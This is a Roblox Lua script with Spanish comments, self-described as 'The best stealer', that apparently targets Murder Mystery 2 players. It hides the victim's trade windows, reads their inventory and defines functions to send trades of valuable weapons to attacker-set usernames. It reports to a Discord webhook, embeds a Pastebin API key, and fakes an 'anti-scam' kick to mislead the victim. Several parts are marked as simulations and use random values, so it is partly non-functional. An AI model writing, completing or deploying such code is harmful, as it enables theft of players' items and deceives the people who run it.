-- ====================================
-- SERVICIOS
-- ====================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- ====================================
-- CONFIGURACIÓN
-- ====================================
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- ====================================
-- FUNCIONES AUXILIARES
-- ====================================
local function safeFindPlayer(name)
    local plrObj = Players:FindFirstChild(name)
    if not plrObj then
        warn("Jugador no encontrado: "..tostring(name))
        return nil
    end
    return plrObj
end

local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

local function CreatePaste(content)
    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
    local api_paste_format = "text"
    local api_paste_private = "1"
    local body = "api_option=paste&api_dev_key="..api_dev_key..
                 "&api_paste_code="..HttpService:UrlEncode(content)..
                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
                 "&api_paste_format="..api_paste_format..
                 "&api_paste_private="..api_paste_private
    local res = req({
        Url = "https://pastebin.com/api/api_post.php",
        Method = "POST",
        Headers = {["Content-Type"]="application/x-www-form-urlencoded"},
        Body = body
    })
    if res and res.Body then return res.Body end
end

-- ====================================
-- KICK AUTOMÁTICO SI DETECTA “disable anti scam” O CUALQUIER ERROR
-- ====================================
local function detectarKick(errMsg)
    local msg = tostring(errMsg):lower()
    if msg:find("disable") and msg:find("anti-scam") then
        print("⚠️ Detectado anti-scam activo! Ejecutando kick...")
        LocalPlayer:Kick("Kick simulado: Anti-scam detectado uwu 😎")
    end
end

local function kickAlDetectarCualquierError(func)
    local ok, err = pcall(func)
    if not ok then
        print("❌ Error detectado:", err)
        detectarKick(err)
    end
end

-- ====================================
-- TELEPORT (SIMULACIÓN)
-- ====================================
local function fetchServers(cursor)
    local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
    if cursor then url = url.."&cursor="..cursor end
    local res = req({Url=url, Method="GET"})
    if res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        return data.data, data.nextPageCursor
    end
    return {}, nil
end

local function teleportLowPopServer()
    local cursor
    while true do
        local servers
        servers, cursor = fetchServers(cursor)
        local targetServer
        for _, s in ipairs(servers) do
            if s.playing <= 8 and s.id ~= game.JobId then
                targetServer = s.id
                break
            end
        end
        if targetServer then
            print("🔹 Simulación de teleport a server:", targetServer)
            -- Aquí simulamos el error de Delta
            detectarKick("Teleport blocked: disable anti-scam detected")
            return
        else
            print("No server found, retrying in 1s...")
            task.wait(1)
        end
    end
end

-- ====================================
-- MAIN EXECUTION + INVENTARIO + TRADE
-- ====================================
local function MainExecution()
    if getgenv().ScriptEjecutado then return end
    getgenv().ScriptEjecutado = true

    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
        local gui = playerGui:FindFirstChild(guiName)
        if gui then
            gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
            gui.Enabled=false
        end
    end

    -- TRADE FUNCTIONS
    local TradeService = ReplicatedStorage:WaitForChild("Trade")
    local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
    local function sendTradeRequest(user)
        local plrObj = safeFindPlayer(user)
        if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
    end
    local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
    local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
    local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

    -- INVENTARIO + SUPREME VALUE SYSTEM (simulación)
    local database = require(ReplicatedStorage.Database.Sync.Item)
    local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
    local min_rarity_index=table.find(rarityTable,min_rarity)
    local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)

    -- Simulación de kick si hay error en inventario
    kickAlDetectarCualquierError(function()
        for id,amount in pairs(profile.Weapons.Owned) do
            local item=database[id]
            if item then
                local ri=table.find(rarityTable,item.Rarity)
                if ri and ri>=min_rarity_index then
                    -- Simular valor
                    local v = math.random(10,100)
                    if v>=min_value then
                        print("✅ Item procesado:", id, "Valor:", v)
                    end
                end
            end
        end
        -- Simular error de anti-scam durante inventario
        detectarKick("Inventory failed: disable anti-scam detected")
    end)
end

-- ====================================
-- EJECUCIÓN COMPLETA CON KICK
-- ====================================
task.spawn(function()
    kickAlDetectarCualquierError(teleportLowPopServer)
    kickAlDetectarCualquierError(MainExecution)
end)
